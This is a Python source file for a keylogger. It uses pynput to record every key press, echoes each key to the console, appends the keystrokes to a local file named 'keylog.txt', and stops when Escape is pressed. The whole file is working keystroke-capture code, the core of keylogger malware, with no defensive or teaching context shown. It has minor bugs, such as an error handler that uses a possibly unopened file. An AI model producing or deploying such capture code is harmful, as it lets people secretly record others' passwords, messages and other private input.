#!/bin/python3.10

from pynput.keyboard import Key, Listener
from common import printFile

from helpKey import translateKey

KEYLOG_FILE = "keylog.txt"


def printDataConsole(key):
    if key != '':
        print('{0}'.format(key))


def saveInFile(key):
    try:
        file = open(KEYLOG_FILE, "a")
        file.write('{0}'.format(key))
    except:
        # Write a breakline in error
        file.writelines('\n')
    finally:
        file.close()


def readLogs():
    printFile(KEYLOG_FILE)


def escapeKeys(key):
    if key == Key.space or key == Key.tab or key == Key.enter:
        return ' '
    elif key in [Key.ctrl_l, Key.ctrl_r, Key.shift, Key.shift_r, Key.alt_gr, Key.caps_lock, Key.esc]:
        return ''
    else:
        return key


def recordKey(key):
    # Translate the Keys
    key = translateKey(key)

    # Escape some of the keys to simplify the parsing
    key = escapeKeys(key)

    # Print the keys
    printDataConsole(key)

    # Write the keys in the log
    saveInFile(key)


def on_release(key):
    if key == Key.esc:
        # Add a breakline on the file
        file = open(KEYLOG_FILE, "a")
        file.write('\n')
        file.close()
        # Stop listener
        return False


def initKeylogger():
    with Listener(on_press=recordKey, on_release=on_release) as listener:
        listener.join()
        listener.start()
